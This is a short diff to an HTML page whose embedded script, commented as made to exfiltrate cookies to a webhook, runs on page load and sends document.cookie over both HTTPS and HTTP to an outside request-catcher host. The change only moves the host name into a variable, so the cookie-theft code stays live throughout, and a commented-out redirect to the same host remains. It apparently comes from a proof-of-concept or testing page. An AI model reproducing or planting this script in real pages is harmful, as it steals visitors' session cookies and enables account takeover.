@@ -331,17 +331,19 @@
 		<!-- Script to exfiltrate cookie to Webhook -->
 		<script>
 			function sendMessage() {
+				var webhook_url = "3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com";
+				
 				var request_https = new XMLHttpRequest();
-				request_https.open("GET", "https://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test?script=local&"+document.cookie);
+				request_https.open("GET", "https://"+webhook_url+"/test?script=local&"+document.cookie);
 				request_https.send();
 				
 				var request_http = new XMLHttpRequest();
-				request_http.open("GET", "http://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test?script=local&"+document.cookie);
+				request_http.open("GET", "http://"+webhook_url+"/test?script=local&"+document.cookie);
 				request_http.send();	
 			}
 		    	sendMessage()
 		    	
-		    	<!--window.location.href = "https://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test";-->
+		    	<!--window.location.href = "https://"+webhook_url+"/test";-->
 		</script>
 	</body>
 </html>
